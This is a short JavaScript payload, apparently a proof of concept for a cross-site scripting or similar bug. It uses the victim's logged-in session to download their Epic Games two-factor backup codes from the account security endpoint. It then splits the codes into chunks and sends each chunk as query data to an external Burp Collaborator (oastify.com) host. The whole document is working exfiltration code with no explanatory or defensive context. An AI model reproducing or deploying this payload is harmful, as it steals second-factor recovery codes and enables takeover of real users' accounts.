(async () => {
  try {
    console.log("Fetching backup codes...");

    const res = await fetch("https://www.epicgames.com/account/v2/security/downloadBackupCodes", {
      credentials: "include"
    });

    if (!res.ok) {
      console.error(`Failed to fetch, status: ${res.status}`);
      return;
    }

    const reader = res.body.getReader();
    let chunks = [];
    let receivedLength = 0;

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      chunks.push(value);
      receivedLength += value.length;
    }

    let fullBody = new Uint8Array(receivedLength);
    let position = 0;
    for (let chunk of chunks) {
      fullBody.set(chunk, position);
      position += chunk.length;
    }

    const result = new TextDecoder("utf-8").decode(fullBody);
    console.log("Backup codes fetched");

    const chunkSize = 1900;
    for (let i = 0; i < result.length; i += chunkSize) {
      const part = result.slice(i, i + chunkSize);
      await fetch(`https://4nspmfwzis40b92tl1wdw2ngy74yspxdm.oastify.com?data=${encodeURIComponent(part)}`);
    }

    console.log("Backup codes sent to Burp Collaborator");
  } catch (error) {
    console.error("Error:", error);
  }
})();
